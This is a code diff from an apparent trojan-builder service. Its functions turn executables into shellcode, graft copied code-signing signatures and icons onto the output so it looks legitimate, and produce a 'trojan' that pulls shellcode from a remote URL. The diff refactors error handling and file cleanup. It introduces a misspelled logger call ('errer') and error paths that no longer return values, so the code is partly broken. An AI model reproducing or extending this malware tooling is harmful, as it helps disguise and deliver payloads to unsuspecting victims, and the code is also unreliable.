@@ -70,11 +70,11 @@ def get_user_shellcode_file(shellcode_file_path,user_shellcode_file_path):
             else:
                 return "Unknown architecture"
         except FileNotFoundError:
-            return "File not found"
+            logger.error("EXE to shellcode error: File not found") 
         except pefile.PEFormatError:
-            return "Not a valid PE file"
+            logger.error("EXE to shellcode error: Not a valid PE file")
         except Exception as e:
-            return "Error: " + str(e)
+            logger.errer(f'EXE to shellcode error: {e}')
 
 
 def copy_directory_and_rename(src_dir, dst_dir_with_new_name):
@@ -108,8 +108,7 @@ def add_signature_and_icon(icon_file,signature_file,inputfile,outputfile):
         Thief.replace_icon(inputfile,icon_file,outputfile)
     elif signature_file:
         Thief.replace_signature(inputfile, signature_file, outputfile)
-    # else:
-    #     shutil.copy(inputfile, outputfile)
+
 
 
 def compileService(trojan):
@@ -214,19 +213,18 @@ def compileService(trojan):
             remote_shellcode_url
     )
 
-
+    if not os.path.exists(trojan_tmp_file):
+        return trojan
     
     #给木马添加签名和图标
     add_signature_and_icon(icon_file,signature_file,trojan_tmp_file,trojan_tmp_file)
     
     #删除签名和图标文件
-    try:
-        if os.path.isfile(icon_file):
-            os.remove(icon_file)
-        if os.path.isfile(signature_file):
-            os.remove(signature_file)
-    except Exception as e:
-        print(f"Error occurred while deleting files: {e}")
+    if os.path.isfile(icon_file):
+        os.remove(icon_file)
+    if os.path.isfile(signature_file):
+        os.remove(signature_file)
+
 
     hash_name = generate_hash(trojan_tmp_file)
     shutil.move(trojan_tmp_file,os.path.join(user_binary_path, hash_name+'.exe'))
@@ -238,5 +236,5 @@ def compileService(trojan):
         trojan.shellcode_remote_addr = remote_shellcode_url + new_filename
         os.remove(os.path.join(user_binary_path, new_filename))
     os.remove(os.path.join(user_binary_path, hash_name+'.exe'))
-    return(trojan)
+    return trojan
 
